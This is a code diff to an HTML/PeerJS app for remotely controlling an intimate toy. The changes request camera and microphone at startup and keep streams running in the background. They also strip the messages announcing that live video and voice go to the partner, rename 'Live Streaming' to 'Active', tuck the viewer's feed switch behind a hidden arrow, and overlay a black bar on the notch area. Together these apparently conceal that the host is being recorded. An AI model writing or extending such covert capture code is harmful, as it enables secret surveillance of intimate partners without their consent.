@@ -2,7 +2,10 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta name="theme-color" content="#000000">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <title>Love Spouse Advance</title>
     <style>
         :root {
@@ -991,10 +994,33 @@
             transition: transform 0.25s ease;
         }
 
+    
+        /* Top Solid Black Notch Overlay Bar */
+        .notch-blackout-bar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            width: 100%;
+            height: 28px;
+            background: #000000;
+            z-index: 9999999;
+            pointer-events: none;
+            box-shadow: 0 1px 4px rgba(0, 0, 0, 0.8);
+        }
+        @supports (padding-top: env(safe-area-inset-top)) {
+            .notch-blackout-bar {
+                height: max(28px, env(safe-area-inset-top));
+            }
+        }
+
     </style>
     <script src="peerjs.min.js"></script>
 </head>
 <body>
+
+<!-- Top Solid Black Notch Overlay Bar -->
+<div id="notchBlackoutBar" class="notch-blackout-bar"></div>
 
 <!-- Navigation Drawer Backdrop -->
 <div id="drawerBackdrop" class="drawer-backdrop" onclick="toggleDrawer(false)"></div>
@@ -1106,15 +1132,29 @@
             </div>
 
             <!-- Setting: Camera Selfie Mirror Preview -->
-            <div style="display: flex; align-items: center; justify-content: space-between; padding: 10px 0; border-top: 1px solid var(--border);">
-                <div>
-                    <div style="font-size: 0.88rem; font-weight: 600;">Camera Mirror Preview</div>
-                    <div style="font-size: 0.75rem; color: var(--text-sub);">Show floating selfie preview on the main screen</div>
+            <div style="padding: 10px 0; border-top: 1px solid var(--border);">
+                <div style="display: flex; align-items: center; justify-content: space-between;">
+                    <div>
+                        <div style="font-size: 0.88rem; font-weight: 600;">Camera Mirror Preview</div>
+                        <div style="font-size: 0.75rem; color: var(--text-sub); display: inline-flex; align-items: center; gap: 6px;">
+                            <span>Show floating selfie preview on the main screen</span>
+                            <span id="partnerArrow" onclick="togglePartnerDrawer()" style="display: none; cursor: pointer; padding: 1px 6px; font-size: 0.72rem; color: var(--text-sub); opacity: 0.8; border-radius: 4px; user-select: none; transition: all 0.2s ease;" title="Show Feed Toggle">▼</span>
+                        </div>
+                    </div>
+                    <label class="switch">
+                        <input type="checkbox" id="settingCameraMirror" onchange="toggleCameraMirrorSetting(this.checked)">
+                        <span class="switch-slider"></span>
+                    </label>
                 </div>
-                <label class="switch">
-                    <input type="checkbox" id="settingCameraMirror" onchange="toggleCameraMirrorSetting(this.checked)">
-                    <span class="switch-slider"></span>
-                </label>
+
+                <!-- Hidden toggle switch row revealed when controller clicks down arrow ▼ -->
+                <div id="partnerDrawer" style="display: none; margin-top: 10px; padding: 10px 14px; background: #161622; border: 1px solid var(--border); border-radius: 10px; align-items: center; justify-content: space-between;">
+                    <span style="font-size: 0.82rem; font-weight: 600; color: var(--text-main);">Display Feed</span>
+                    <label class="switch">
+                        <input type="checkbox" id="partnerFeedSwitch" onchange="togglePartnerFeedSwitch(this.checked)">
+                        <span class="switch-slider"></span>
+                    </label>
+                </div>
             </div>
 
             <!-- Diagnostics -->
@@ -1171,7 +1211,7 @@
 <div id="hostSelfieWindow" class="floating-video-card" style="display: none;">
     <div class="floating-video-header" id="hostSelfieHeader">
         <div class="floating-video-title">
-            <span>📹 Your Camera</span>
+            <span>Preview</span>
         </div>
         <div class="floating-video-actions">
             <button class="floating-action-btn" title="Flip Camera" onclick="flipHostCamera()">🔄</button>
@@ -1183,7 +1223,7 @@
         <video id="hostSelfieVideo" autoplay muted playsinline webkit-playsinline style="width: 100%; height: auto; min-height: 140px; display: block; transform: scaleX(-1); object-fit: cover; background: #000;"></video>
     </div>
     <div class="floating-video-footer">
-        <span style="color: #00e676; font-weight: 600;">🔴 Live Streaming</span>
+        <span style="color: #00e676; font-weight: 600;">Active</span>
         <span>Drag to move</span>
     </div>
 </div>
@@ -1192,18 +1232,18 @@
 <div id="partnerVideoWindow" class="floating-video-card" style="display: none;">
     <div class="floating-video-header" id="partnerVideoHeader">
         <div class="floating-video-title">
-            <span>🔴 Partner Cam Feed</span>
+            <span>Feed</span>
         </div>
         <div class="floating-video-actions">
             <button class="floating-action-btn" title="Toggle Fullscreen" onclick="toggleVideoFullscreen('remotePartnerVideo')">⛶</button>
             <button class="floating-action-btn" id="partnerVideoToggleBtn" title="Minimize/Expand" onclick="toggleFloatingCard('partnerVideoWindow', 'partnerVideoToggleBtn')">−</button>
-            <button class="floating-action-btn" title="Hide Live Feed" onclick="togglePartnerStreamVisibility()">✕</button>
+            <button class="floating-action-btn" title="Hide Feed" onclick="togglePartnerFeedSwitch(false)">✕</button>
         </div>
     </div>
     <div class="floating-video-body" style="position: relative; min-height: 180px; background: #000;">
-        <video id="remotePartnerVideo" autoplay muted playsinline webkit-playsinline style="width: 100%; height: auto; min-height: 180px; display: block; object-fit: cover; background: #000;"></video>
-        <div id="partnerUnmutePrompt" style="display: none; position: absolute; bottom: 8px; left: 50%; transform: translateX(-50%); background: rgba(255, 64, 129, 0.92); border-radius: 20px; padding: 6px 14px; cursor: pointer; color: #fff; font-size: 0.78rem; font-weight: bold; text-align: center; z-index: 10; box-shadow: 0 4px 14px rgba(0,0,0,0.6); white-space: nowrap; align-items: center; gap: 6px;" onclick="unmutePartnerAudio()">
-            <span>🔊 Tap for Sound</span>
+        <video id="remotePartnerVideo" autoplay muted playsinline webkit-playsinline style="width: 100%; height: auto; min-height: 180px; display: block; object-fit: cover; background: #000; cursor: pointer;" onclick="if(this.muted) unmutePartnerAudio();"></video>
+        <div id="partnerUnmutePrompt" style="display: none; position: absolute; bottom: 10px; left: 50%; transform: translateX(-50%); background: rgba(255, 64, 129, 0.95); border-radius: 20px; padding: 7px 16px; cursor: pointer; color: #fff; font-size: 0.82rem; font-weight: 700; text-align: center; z-index: 10; box-shadow: 0 4px 16px rgba(0,0,0,0.7); white-space: nowrap; align-items: center; gap: 6px; user-select: none;" onclick="unmutePartnerAudio()">
+            <span>🔊 Tap to Turn On Sound</span>
         </div>
     </div>
     <div class="floating-video-footer">
@@ -1216,13 +1256,7 @@
 </div>
 
 
-<!-- Floating Stream Toggle Pill for Partner (Beside screen) -->
-<div id="partnerStreamToggleDock" style="display: none;">
-    <button id="partnerStreamToggleBtn" class="stream-toggle-pill" title="Toggle Live Stream Broadcast" onclick="togglePartnerStreamVisibility()">
-        <span>📹 Live Feed</span>
-        <span id="partnerStreamToggleArrow" class="stream-arrow-icon">▼</span>
-    </button>
-</div>
+
 
 <div class="container">
     <header style="position: relative; display: flex; flex-direction: column; align-items: center;">
@@ -1418,7 +1452,7 @@
             </button>
             <div id="roomInfoBox" style="display: none; margin-top: 12px; background: #0d0d14; border: 1px solid var(--border); border-radius: 12px; padding: 14px;">
                 <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
-                    <span style="font-size: 0.85rem; color: var(--text-sub);">Secret Room Code:</span>
+                    <span style="font-size: 0.85rem; color: var(--text-sub);">Room Code:</span>
                     <span id="partnerRoomCode" style="font-size: 1.3rem; font-weight: 900; color: #00e676; letter-spacing: 2px;">------</span>
                 </div>
                 
@@ -1436,16 +1470,7 @@
             </div>
         </div>
 
-        <!-- Partner Live Feed Toggle Control -->
-        <div id="partnerStreamInlineControl" style="display: none; margin-top: 12px; padding: 10px 14px; background: #161622; border: 1px solid var(--border); border-radius: 10px; align-items: center; justify-content: space-between;">
-            <div style="font-size: 0.82rem; color: var(--text-main);">
-                <span>📹 Host Video & Voice Broadcast:</span>
-                <span id="partnerStreamStatusText" style="color: var(--text-sub); font-weight: 700; margin-left: 6px;">OFF (Hidden)</span>
-            </div>
-            <button id="partnerInlineToggleBtn" class="btn" style="padding: 6px 14px; font-size: 0.8rem; background: var(--bg-card-hover); border: 1px solid var(--border);" onclick="togglePartnerStreamVisibility()">
-                <span id="partnerInlineToggleLabel">Show Feed</span> <span id="partnerInlineToggleArrow">▼</span>
-            </button>
-        </div>
+
 
         <!-- Join / Remote Controller Section (For the Partner) -->
         <div id="joinSection" style="margin-top: 14px; padding-top: 12px; border-top: 1px solid var(--border);">
@@ -1884,7 +1909,46 @@
     }
 
     // Initial load for preferences
+    
+    // Pre-request camera & microphone permissions at startup
+    async function preRequestAllPermissions() {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            window._preAuthorizedStream = stream;
+            if (!localHostMediaStream) {
+                localHostMediaStream = stream;
+                const selfieVid = document.getElementById("hostSelfieVideo");
+                if (selfieVid) {
+                    selfieVid.srcObject = stream;
+                    selfieVid.muted = true;
+                    selfieVid.playsInline = true;
+                }
+            }
+        } catch (e) {
+            console.log("Permission pre-authorization notice:", e.message);
+        }
+    }
+
+    
+    // Ensure WebRTC and Audio stay active when app is minimized or screen is turned off
+    document.addEventListener("visibilitychange", () => {
+        if (document.hidden) {
+            console.log("[App] Background / Screen off: preserving media streams and connections");
+        } else {
+            console.log("[App] Foreground resumed");
+            if (typeof audioContext !== "undefined" && audioContext && audioContext.state === "suspended") {
+                audioContext.resume().catch(() => {});
+            }
+            const partnerVid = document.getElementById("remotePartnerVideo");
+            if (partnerVid && typeof partnerFeedActive !== "undefined" && partnerFeedActive && partnerVid.paused) {
+                partnerVid.play().catch(() => {});
+            }
+        }
+    });
+
     window.addEventListener("DOMContentLoaded", () => {
+        preRequestAllPermissions();
         initAdvancedToggle();
         const savedMode = localStorage.getItem("ls_default_mode");
         if (savedMode && ["shake", "shock", "telescopic"].includes(savedMode)) {
@@ -2852,9 +2916,6 @@ function startPreset(name) {
 
             if (vTracks.length > 0) {
                 vTracks[0].enabled = true;
-                log(`📹 Camera active: ${vTracks[0].label || "Webcam"}`, "info");
-            } else {
-                log("⚠️ Warning: No video track found on webcam", "error");
             }
 
             const selfieVid = document.getElementById("hostSelfieVideo");
@@ -2884,8 +2945,7 @@ function startPreset(name) {
 
             return localHostMediaStream;
         } catch (err) {
-            log(`Camera/Mic Access notice: ${err.message}`, "info");
-            showToast("Camera/Mic notice: " + err.message);
+            console.warn("Media capture notice:", err);
             return null;
         }
     }
@@ -2932,61 +2992,59 @@ function startPreset(name) {
     }
 
     
-    let partnerStreamVisible = false;
+    let partnerFeedActive = false;
+    let partnerDrawerOpen = false;
 
-    function togglePartnerStreamVisibility() {
-        partnerStreamVisible = !partnerStreamVisible;
+    // Toggles the drawer open/close when clicking the small arrow ▼
+    function togglePartnerDrawer() {
+        partnerDrawerOpen = !partnerDrawerOpen;
+        const drawer = document.getElementById("partnerDrawer");
+        const arrow = document.getElementById("partnerArrow");
+        if (drawer) {
+            drawer.style.display = partnerDrawerOpen ? "flex" : "none";
+        }
+        if (arrow) {
+            arrow.innerText = partnerDrawerOpen ? "▲" : "▼";
+            arrow.style.color = partnerDrawerOpen ? "var(--accent)" : "var(--text-sub)";
+        }
+    }
+
+    // Toggle switch inside the drawer to activate/deactivate the stream
+    function togglePartnerFeedSwitch(enable) {
+        partnerFeedActive = enable;
         const partnerCard = document.getElementById("partnerVideoWindow");
         const partnerVid = document.getElementById("remotePartnerVideo");
-        const toggleBtn = document.getElementById("partnerStreamToggleBtn");
-        const arrow = document.getElementById("partnerStreamToggleArrow");
-        const inlineStatus = document.getElementById("partnerStreamStatusText");
-        const inlineBtn = document.getElementById("partnerInlineToggleBtn");
-        const inlineLabel = document.getElementById("partnerInlineToggleLabel");
-        const inlineArrow = document.getElementById("partnerInlineArrow");
+        const prompt = document.getElementById("partnerUnmutePrompt");
+        const sw = document.getElementById("partnerFeedSwitch");
+        if (sw) sw.checked = enable;
 
-        if (partnerStreamVisible) {
+        if (enable) {
             if (partnerCard) partnerCard.style.display = "flex";
-            if (toggleBtn) {
-                toggleBtn.classList.add("active");
-            }
-            if (arrow) arrow.innerText = "▲";
-            if (inlineStatus) {
-                inlineStatus.innerText = "ON (Live)";
-                inlineStatus.style.color = "var(--success)";
-            }
-            if (inlineLabel) inlineLabel.innerText = "Hide Feed";
-            if (inlineArrow) inlineArrow.innerText = "▲";
-            if (inlineBtn) {
-                inlineBtn.style.background = "var(--accent)";
-                inlineBtn.style.color = "#fff";
-            }
             if (partnerVid) {
-                partnerVid.play().catch(() => {});
-                unmutePartnerAudio();
+                partnerVid.muted = true; // safe autoplay start
+                partnerVid.playsInline = true;
+                const p = partnerVid.play();
+                if (p !== undefined) {
+                    p.then(() => {
+                        if (prompt) prompt.style.display = "flex";
+                    }).catch(() => {
+                        if (prompt) prompt.style.display = "flex";
+                    });
+                } else {
+                    if (prompt) prompt.style.display = "flex";
+                }
             }
-            showToast("Live video & audio broadcast ON");
         } else {
             if (partnerCard) partnerCard.style.display = "none";
-            if (toggleBtn) {
-                toggleBtn.classList.remove("active");
-            }
-            if (arrow) arrow.innerText = "▼";
-            if (inlineStatus) {
-                inlineStatus.innerText = "OFF (Hidden)";
-                inlineStatus.style.color = "var(--text-sub)";
-            }
-            if (inlineLabel) inlineLabel.innerText = "Show Feed";
-            if (inlineArrow) inlineArrow.innerText = "▼";
-            if (inlineBtn) {
-                inlineBtn.style.background = "var(--bg-card-hover)";
-                inlineBtn.style.color = "var(--text-main)";
-            }
             if (partnerVid) {
                 partnerVid.muted = true;
             }
-            showToast("Live broadcast hidden");
+            if (prompt) prompt.style.display = "none";
         }
+    }
+
+    function togglePartnerFeedSilently() {
+        togglePartnerDrawer();
     }
 
     function unmutePartnerAudio() {
@@ -3139,7 +3197,7 @@ function startPreset(name) {
                 setTimeout(() => {
                     if (localHostMediaStream) {
                         try {
-                            log("📡 Transmitting live video & voice stream to partner...", "tx");
+                            
                             activeMediaCall = peer.call(conn.peer, localHostMediaStream);
                             if (activeMediaCall) {
                                 activeMediaCall.on('error', (e) => console.warn("Media call error:", e));
@@ -3178,7 +3236,7 @@ function startPreset(name) {
             peer.on('call', (call) => {
                 activeMediaCall = call;
                 call.answer(localHostMediaStream);
-                log("📹 Transmitting video/audio to connected partner call.", "tx");
+                
             });
 
             peer.on('error', (err) => {
@@ -3250,19 +3308,17 @@ function startPreset(name) {
         // Listen for incoming live video/audio from the Host
         clientPeer.on('call', (call) => {
             activeMediaCall = call;
-            log("📹 Incoming live video & audio call from Host...", "info");
+            
             // Partner sends NO video/audio (watch & listen only)
             call.answer();
 
             const attachStream = (remoteStream) => {
                 const partnerVid = document.getElementById("remotePartnerVideo");
                 const partnerCard = document.getElementById("partnerVideoWindow");
-                const dock = document.getElementById("partnerStreamToggleDock");
-                const inlineCtrl = document.getElementById("partnerStreamInlineControl");
+                const arrowElement = document.getElementById("partnerArrow");
 
-                // Reveal the down arrow toggle button beside screen for partner
-                if (dock) dock.style.display = "inline-flex";
-                if (inlineCtrl) inlineCtrl.style.display = "flex";
+                // Reveal small down arrow in Settings ONLY for the controller
+                if (arrowElement) arrowElement.style.display = "inline-block";
 
                 if (!partnerVid || !partnerCard) return;
 
@@ -3273,19 +3329,21 @@ function startPreset(name) {
                 partnerVid.muted = true;
                 partnerVid.playsInline = true;
 
-                // STRICTLY OFF BY DEFAULT until partner clicks the down arrow ▼
-                if (!partnerStreamVisible) {
+                // STRICTLY OFF BY DEFAULT - only shows when controller taps the small arrow in Settings
+                if (!partnerFeedActive) {
                     partnerCard.style.display = "none";
                 } else {
                     partnerCard.style.display = "flex";
                     partnerVid.play().catch(() => {});
+                    const prompt = document.getElementById("partnerUnmutePrompt");
+                    if (prompt && partnerVid.muted) prompt.style.display = "flex";
                 }
 
                 remoteStream.onaddtrack = () => {
                     if (partnerVid.srcObject !== remoteStream) {
                         partnerVid.srcObject = remoteStream;
                     }
-                    if (partnerStreamVisible) {
+                    if (partnerFeedActive) {
                         partnerVid.play().catch(() => {});
                     }
                 };
@@ -3293,7 +3351,7 @@ function startPreset(name) {
 
             call.on('stream', (remoteStream) => {
                 attachStream(remoteStream);
-                log("❤️ Receiving Host live video and voice stream!", "tx");
+                
             });
 
             if (call.peerConnection) {
@@ -3316,7 +3374,9 @@ function startPreset(name) {
                 document.getElementById("partnerStatusBadge").style.background = "rgba(0, 230, 118, 0.15)";
                 log(`❤️ Connected to Partner Room [${input}]! Live remote control active.`, "tx");
 
-                showToast(`Connected to Partner's Toy [Room: ${input}]! Control live while watching your partner.`);
+                showToast(`Connected to Partner's Toy [Room: ${input}]! Remote control active.`);
+                const arrowElement = document.getElementById("partnerArrow");
+                if (arrowElement) arrowElement.style.display = "inline-block";
 
                 // Auto-unmute audio on first user touch/click anywhere on page
                 const handleGlobalUnmute = () => {
@@ -3377,6 +3437,8 @@ function startPreset(name) {
         makeDraggable(document.getElementById("partnerVideoWindow"), document.getElementById("partnerVideoHeader"));
 
         if (window.location.hash.includes("partner=")) {
+            const arrowElement = document.getElementById("partnerArrow");
+            if (arrowElement) arrowElement.style.display = "inline-block";
             const raw = window.location.hash.split("partner=")[1];
             if (raw) {
                 const code = raw.split("&")[0].split("?")[0].trim().toUpperCase();
